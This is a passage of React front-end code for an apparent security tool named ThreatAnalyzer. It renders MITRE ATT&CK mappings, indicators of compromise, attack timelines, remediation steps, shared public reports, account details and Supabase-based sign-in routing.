          {result.mitreMapping?.length > 0 && (
            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
              <p style={{ fontSize:12, color:'#aaa', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:8 }}>MITRE ATT&CK</p>
              <p style={{ fontSize:36, fontWeight:500, lineHeight:1, color:COLORS.primary, marginBottom:12 }}>{result.mitreMapping.length}</p>
              <p style={{ fontSize:13, fontWeight:500, color:'#1a1a2e', marginBottom:10 }}>Techniques detected</p>
              {result.confidence !== undefined && <ConfBar value={result.confidence} label="Confidence" />}
              <div style={{ marginTop:12, display:'flex', flexWrap:'wrap', gap:4 }}>
                {result.mitreMapping.slice(0,4).map((m,i)=>(
                  <span key={i} style={{ fontSize:10, background:COLORS.primaryLt, color:COLORS.primary, padding:'2px 6px', borderRadius:4, fontFamily:'monospace', fontWeight:600 }}>{m.technique}</span>
                ))}
              </div>
            </div>
          )}
          {result.iocs?.length > 0 && (
            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
              <p style={{ fontSize:12, color:'#aaa', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:8 }}>IOCs found</p>
              <p style={{ fontSize:36, fontWeight:500, lineHeight:1, color:COLORS.danger, marginBottom:12 }}>{result.iocs.length}</p>
              <p style={{ fontSize:13, fontWeight:500, color:'#1a1a2e', marginBottom:10 }}>Indicators of compromise</p>
              <ul style={{ fontSize:12, color:'#666', lineHeight:1.8, listStyle:'none', padding:0 }}>
                {['IP','Domain','Hash','File'].map(type=>{
                  const count=(result.iocs||[]).filter(i=>i.type===type).length;
                  if(!count)return null;
                  return <li key={type} style={{ display:'flex', justifyContent:'space-between' }}><span>{type}</span><span style={{ fontWeight:500, color:'#1a1a2e' }}>{count}</span></li>;
                })}
              </ul>
            </div>
          )}
        </div>

        {/* Code block for extracted snippet */}
        {codeLines.length > 0 && (
          <div style={{ marginBottom:16 }}>
            <CodeBlock
              title="Extracted indicators — key findings"
              badge={result.mitreMapping?.[0] ? `${result.mitreMapping[0].technique} — ${result.mitreMapping[0].tactic}` : undefined}
              lines={codeLines}
              pills={codePills}
            />
          </div>
        )}

        {/* Summary card */}
        <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20, marginBottom:16 }}>
          <p style={{ fontSize:12, color:'#aaa', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:8 }}>Executive summary</p>
          <p style={{ fontSize:14, color:'#1a1a2e', lineHeight:1.7 }}>{result.summary}</p>
        </div>

        {/* Tags */}
        {scanId && (
          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20, marginBottom:16 }}>
            <TagEditor scanId={scanId} initialTags={[]} onUpdate={()=>{}} />
          </div>
        )}

        {/* Tab navigation */}
        <div style={{ display:'flex', gap:2, background:'#F5F7FA', borderRadius:8, padding:3, marginBottom:20, border:`0.5px solid ${COLORS.border}`, overflowX:'auto', flexShrink:0 }}>
          {tabs.map(t=>(
            <button key={t.id} onClick={()=>setTab(t.id)}
              style={{ padding:'7px 16px', borderRadius:6, fontSize:13, cursor:'pointer', fontWeight:500, whiteSpace:'nowrap',
                background:tab===t.id?'#fff':'transparent', color:tab===t.id?'#1a1a2e':'#888',
                border:tab===t.id?`0.5px solid ${COLORS.border}`:'none' }}>
              {t.label}
            </button>
          ))}
        </div>

        {/* Overview */}
        {tab==='overview' && (
          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, overflow:'hidden' }}>
              <div style={{ padding:'14px 20px', borderBottom:`0.5px solid ${COLORS.border}` }}>
                <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e' }}>Affected systems</p>
              </div>
              {(result.affectedSystems||[]).map((sys,i)=>(
                <div key={i} style={{ padding:'14px 20px', borderTop:i===0?'none':`0.5px solid ${COLORS.border}`, display:'flex', alignItems:'center', gap:12 }}>
                  <div style={{ width:8, height:8, borderRadius:'50%', flexShrink:0, background:riskColor(sys.risk) }} />
                  <span style={{ fontFamily:'monospace', fontSize:13, color:'#1a1a2e', flex:1 }}>{sys.host}</span>
                  <span style={{ fontSize:12, color:'#888' }}>{sys.status}</span>
                  <div style={{ width:80, height:4, background:'#eee', borderRadius:2, overflow:'hidden' }}>
                    <div style={{ width:`${sys.risk}%`, height:'100%', background:riskColor(sys.risk), borderRadius:2 }} />
                  </div>
                  <span style={{ fontSize:12, fontWeight:500, color:riskColor(sys.risk), width:36, textAlign:'right', fontFamily:'monospace' }}>{sys.risk}%</span>
                </div>
              ))}
            </div>
            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
              <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:16 }}>
                <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e' }}>MITRE ATT&CK coverage</p>
                <button onClick={()=>setTab('mitre')} style={{ background:'none', border:'none', cursor:'pointer', fontSize:12, color:COLORS.primary }}>View details →</button>
              </div>
              <MitreMatrix mappings={result.mitreMapping||[]} />
            </div>
          </div>
        )}

        {/* Timeline */}
        {tab==='timeline' && (
          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
            <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:4 }}>Attack timeline</p>
            <p style={{ fontSize:12, color:'#888', marginBottom:20 }}>Chronological reconstruction of observed events</p>
            <div style={{ position:'relative' }}>
              <div style={{ position:'absolute', left:5, top:8, bottom:8, width:1, background:COLORS.border }} />
              <div style={{ display:'flex', flexDirection:'column', gap:20 }}>
                {(result.timeline||[]).map((ev,i)=>(
                  <div key={i} style={{ display:'flex', gap:16, paddingLeft:2 }}>
                    <div style={{ width:12, height:12, borderRadius:'50%', flexShrink:0, marginTop:2,
                      background:sevColor(ev.severity), border:'2px solid #fff', zIndex:1 }} />
                    <div style={{ flex:1 }}>
                      <div style={{ display:'flex', flexWrap:'wrap', alignItems:'center', gap:8, marginBottom:6 }}>
                        <code style={{ fontSize:11, background:'#F5F7FA', color:'#888', padding:'2px 8px', borderRadius:4 }}>{ev.time}</code>
                        <SevBadge level={ev.severity} />
                        {ev.tactic && <span style={{ fontSize:11, background:COLORS.primaryLt, color:COLORS.primary, padding:'2px 8px', borderRadius:4 }}>{ev.tactic}</span>}
                      </div>
                      <p style={{ fontSize:13, color:'#1a1a2e', lineHeight:1.6 }}>{ev.event}</p>
                      {ev.confidence !== undefined && (
                        <div style={{ marginTop:6, maxWidth:280 }}><ConfBar value={ev.confidence} label="Confidence" /></div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* MITRE */}
        {tab==='mitre' && (
          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
              <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:16 }}>ATT&CK matrix</p>
              <MitreMatrix mappings={result.mitreMapping||[]} />
            </div>
            <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fill,minmax(260px,1fr))', gap:12 }}>
              {(result.mitreMapping||[]).map((m,i)=>(
                <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:16 }}>
                  <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:8 }}>
                    <code style={{ fontSize:12, fontWeight:600, background:COLORS.primaryLt, color:COLORS.primary, padding:'3px 10px', borderRadius:4 }}>{m.technique}</code>
                    <span style={{ fontSize:11, color:'#aaa' }}>{m.confidence}% conf.</span>
                  </div>
                  <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:2 }}>{m.name}</p>
                  <p style={{ fontSize:11, color:'#888', fontFamily:'monospace', marginBottom:m.evidence?8:6 }}>{m.tactic}</p>
                  {m.evidence && <p style={{ fontSize:12, color:'#666', fontStyle:'italic', marginBottom:8, lineHeight:1.5 }}>"{m.evidence}"</p>}
                  <ConfBar value={m.confidence} />
                </div>
              ))}
            </div>
          </div>
        )}

        {/* IOCs */}
        {tab==='iocs' && (
          <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
            {(result.iocs||[]).map((ioc,i)=>(
              <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:16 }}>
                <div style={{ display:'flex', flexWrap:'wrap', gap:10, alignItems:'flex-start' }}>
                  <div style={{ display:'flex', gap:6, flexShrink:0, paddingTop:1 }}>
                    <code style={{ fontSize:11, fontWeight:600, padding:'3px 10px', borderRadius:4,
                      background:sevBg(ioc.threat), color:sevColor(ioc.threat) }}>{ioc.type}</code>
                    <SevBadge level={ioc.threat} />
                  </div>
                  <div style={{ flex:1, minWidth:0 }}>
                    <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:4 }}>
                      <code style={{ fontSize:13, color:COLORS.danger, fontWeight:500, wordBreak:'break-all' }}>{ioc.value}</code>
                      <button onClick={()=>{ navigator.clipboard.writeText(ioc.value); }}
                        style={{ background:'none', border:'none', cursor:'pointer', color:'#aaa', fontSize:12, flexShrink:0 }} title="Copy">📋</button>
                    </div>
                    <p style={{ fontSize:12, color:'#666', lineHeight:1.5, marginBottom:4 }}>{ioc.description}</p>
                    {ioc.reasoning && <p style={{ fontSize:12, color:'#888', fontStyle:'italic', marginBottom:6 }}>Why: {ioc.reasoning}</p>}
                    {ioc.confidence !== undefined && <div style={{ maxWidth:280 }}><ConfBar value={ioc.confidence} label="Confidence" /></div>}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Remediation */}
        {tab==='remediation' && (
          <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
            {(result.remediation||[]).sort((a,b)=>a.priority-b.priority).map((step,i)=>{
              const catColor = {
                Containment:[COLORS.dangerLt,COLORS.danger],Eradication:['#FAECE7','#993C1D'],
                Recovery:[COLORS.successLt,COLORS.success],Hardening:[COLORS.primaryLt,COLORS.primary],
              }[step.category]||['#F5F7FA','#888'];
              return (
                <div key={i} style={{ background:'#fff', border:`0.5px solid ${step.urgent?COLORS.danger+'44':COLORS.border}`, borderRadius:12, padding:16, display:'flex', gap:14 }}>
                  <div style={{ width:32, height:32, borderRadius:8, display:'flex', alignItems:'center', justifyContent:'center',
                    fontSize:14, fontWeight:500, flexShrink:0,
                    background: step.urgent ? COLORS.dangerLt : '#F5F7FA',
                    color: step.urgent ? COLORS.danger : '#888' }}>
                    {step.priority}
                  </div>
                  <div style={{ flex:1 }}>
                    <div style={{ display:'flex', flexWrap:'wrap', alignItems:'center', gap:8, marginBottom:8 }}>
                      <span style={{ fontSize:11, fontWeight:500, padding:'2px 8px', borderRadius:99, background:catColor[0], color:catColor[1] }}>{step.category}</span>
                      {step.urgent && (
                        <span style={{ fontSize:11, fontWeight:600, padding:'2px 8px', borderRadius:99, display:'flex', alignItems:'center', gap:4,
                          background:COLORS.dangerLt, color:COLORS.danger }}>
                          <span style={{ width:6, height:6, borderRadius:'50%', background:COLORS.danger, animation:'pulse 1s ease-in-out infinite' }} />
                          URGENT
                        </span>
                      )}
                    </div>
                    <p style={{ fontSize:13, color:'#1a1a2e', lineHeight:1.6, marginBottom:step.confidence!==undefined?8:0 }}>{step.action}</p>
                    {step.confidence !== undefined && <div style={{ maxWidth:280 }}><ConfBar value={step.confidence} label="Confidence" /></div>}
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {/* AI Chat */}
        {tab==='chat' && (
          scanId ? <ChatPanel scanId={scanId} />
          : (
            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:48, textAlign:'center' }}>
              <div style={{ fontSize:36, marginBottom:12 }}>💬</div>
              <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>Chat available after saving a scan</p>
              <p style={{ fontSize:13, color:'#888' }}>Run a new analysis and chat will be enabled automatically</p>
            </div>
          )
        )}

      </Container>
    </Page>
  );
}

// ══════════════════════════════════════════════════════════════
// PUBLIC REPORT
// ══════════════════════════════════════════════════════════════
function PublicReport({ scanId, onSignup }) {
  const [scan,setScan]=useState(null);const[loading,setLoading]=useState(true);const[error,setError]=useState('');
  useEffect(()=>{fetch(`${API}/api/public/${scanId}`).then(r=>r.json()).then(d=>{if(d.scan)setScan(d.scan);else setError('Report not found or no longer public.');}).catch(()=>setError('Failed to load.')).finally(()=>setLoading(false));},[scanId]);
  if(loading) return <div style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center' }}><div style={{ width:24, height:24, borderRadius:'50%', border:`2px solid ${COLORS.primaryLt}`, borderTopColor:COLORS.primary, animation:'spin 0.8s linear infinite' }} /></div>;
  if(error) return (
    <div style={{ minHeight:'100vh', background:'#F5F7FA', display:'flex', alignItems:'center', justifyContent:'center', flexDirection:'column', gap:16 }}>
      <div style={{ fontSize:40 }}>🔒</div>
      <p style={{ fontWeight:500, color:'#1a1a2e' }}>{error}</p>
      <button onClick={onSignup} style={btnPrimary}>Create free account</button>
    </div>
  );
  return (
    <div style={{ minHeight:'100vh', background:'#F5F7FA', display:'flex', flexDirection:'column' }}>
      <div style={{ background:COLORS.primaryLt, borderBottom:`0.5px solid ${COLORS.primary}33`, padding:'12px 24px', display:'flex', alignItems:'center', justifyContent:'space-between' }}>
        <div style={{ display:'flex', alignItems:'center', gap:8 }}><ShieldLogo size={22} /><span style={{ fontWeight:500, fontSize:14, color:COLORS.primary }}>ThreatAnalyzer — Shared report</span></div>
        <button onClick={onSignup} style={{ ...btnPrimary, padding:'6px 14px', fontSize:13 }}>Get free account →</button>
      </div>
      <Report result={scan.result} scanId={null} onBack={()=>{}} onNewScan={onSignup} onToast={()=>{}} />
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// ACCOUNT
// ══════════════════════════════════════════════════════════════
function Account({ user, onBack, onSignOut }) {
  return (
    <Page>
      <Header user={user} onNewScan={()=>{}} onAccount={()=>{}} onHome={onBack} />
      <Container style={{ padding:'32px 24px', flex:1 }}>
        <div style={{ marginBottom:24, display:'flex', alignItems:'center', gap:12 }}>
          <button onClick={onBack} style={{ background:'none', border:'none', cursor:'pointer', color:'#888', fontSize:14 }}>← Back</button>
          <span style={{ color:'#ddd' }}>/</span>
          <h1 style={{ fontSize:18, fontWeight:500, color:'#1a1a2e' }}>Account</h1>
        </div>
        <div style={{ maxWidth:480 }}>
          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24, marginBottom:12 }}>
            <div style={{ display:'flex', alignItems:'center', gap:14, marginBottom:20, paddingBottom:20, borderBottom:`0.5px solid ${COLORS.border}` }}>
              <div style={{ width:44, height:44, borderRadius:'50%', background:COLORS.primaryLt, border:`0.5px solid ${COLORS.primary}44`,
                display:'flex', alignItems:'center', justifyContent:'center', fontWeight:500, fontSize:16, color:COLORS.primary }}>
                {user?.email?.[0]?.toUpperCase()}
              </div>
              <div>
                <p style={{ fontWeight:500, fontSize:14, color:'#1a1a2e' }}>{user?.email}</p>
                <p style={{ fontSize:12, color:'#888', marginTop:2 }}>Free account · unlimited scans</p>
              </div>
            </div>
            <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
              {[['Email',user?.email],['Member since',new Date(user?.created_at).toLocaleDateString('en-IN',{dateStyle:'long'})],['Plan','Free — unlimited scans']].map(([l,v])=>(
                <div key={l} style={{ display:'flex', justifyContent:'space-between' }}>
                  <span style={{ fontSize:13, color:'#888' }}>{l}</span>
                  <span style={{ fontSize:13, fontWeight:500, color:'#1a1a2e' }}>{v}</span>
                </div>
              ))}
            </div>
          </div>
          <button onClick={onSignOut} style={{ ...btnOutline, width:'100%', textAlign:'center' }}>Sign out</button>
        </div>
      </Container>
    </Page>
  );
}

// ══════════════════════════════════════════════════════════════
// ROOT APP
// ══════════════════════════════════════════════════════════════
export default function App() {
  const [page,setPage]=useState('landing');const[user,setUser]=useState(null);
  const [result,setResult]=useState(null);const[scanId,setScanId]=useState(null);
  const [scanPublic,setScanPublic]=useState(false);const[toast,setToast]=useState(null);
  const [ready,setReady]=useState(false);const[sharedId,setSharedId]=useState(null);

  useEffect(()=>{
    const sid=getSharedId();
    if(sid){setSharedId(sid);setPage('public');setReady(true);return;}
    supabase.auth.getSession().then(({data})=>{
      if(data.session?.user){setUser(data.session.user);setPage('dashboard');}
      setReady(true);
    });
    const{data:sub}=supabase.auth.onAuthStateChange((_e,session)=>{setUser(session?.user||null);if(!session)setPage('landing');});
    return()=>sub.subscription.unsubscribe();
  },[]);

  const showToast=(msg,type='info')=>setToast({message:msg,type});
  async function signOut(){await supabase.auth.signOut();setUser(null);setPage('landing');}

  if(!ready) return (
    <div style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center', background:'#F5F7FA' }}>
      <div style={{ width:24, height:24, borderRadius:'50%', border:`2px solid ${COLORS.primaryLt}`, borderTopColor:COLORS.primary, animation:'spin 0.8s linear infinite' }} />
    </div>
  );

  return (
    <div style={{ minHeight:'100vh', background:'#F5F7FA', fontFamily:'Inter, system-ui, sans-serif' }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap');
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
        @keyframes fadeIn { from{opacity:0;transform:translateY(-4px)} to{opacity:1;transform:translateY(0)} }
        button:hover { opacity: 0.88; }
        input:focus, textarea:focus { border-color: #185FA5 !important; box-shadow: 0 0 0 3px #185FA522; }
        * { font-family: Inter, system-ui, sans-serif; }
        code, pre, .mono { font-family: 'Source Code Pro', 'Courier New', monospace !important; }
        @media print {
          .no-print { display: none !important; }
          body { background: white; }
        }
      `}</style>

      {toast && <Toast {...toast} onClose={()=>setToast(null)} />}

      {page==='public'&&sharedId&&<PublicReport scanId={sharedId} onSignup={()=>{window.history.pushState({},'','/');setPage('signup');}} />}
      {page==='landing'&&<Landing onLogin={()=>setPage('login')} onSignup={()=>setPage('signup')} />}
      {(page==='login'||page==='signup')&&<Auth mode={page} onSuccess={u=>{setUser(u);setPage('dashboard');}} onSwitch={()=>setPage(page==='login'?'signup':'login')} />}
      {page==='dashboard'&&user&&<Dashboard user={user} onNewScan={()=>setPage('scan')} onViewScan={async id=>{try{const d=await apiFetch(`/api/scans/${id}`);setResult(d.scan.result);setScanId(d.scan.id);setScanPublic(d.scan.is_public||false);setPage('report');}catch(e){showToast(e.message,'error');}}} />}
      {page==='scan'&&user&&<NewScan onComplete={(r,sid)=>{setResult(r);setScanId(sid||null);setScanPublic(false);setPage('report');}} onBack={()=>setPage('dashboard')} />}
      {page==='report'&&result&&<Report result={result} scanId={scanId} isPublic={scanPublic} onBack={()=>setPage('dashboard')} onNewScan={()=>setPage('scan')} onToast={showToast} />}
      {page==='account'&&user&&<Account user={user} onBack={()=>setPage('dashboard')} onSignOut={signOut} />}
    </div>
  );
}
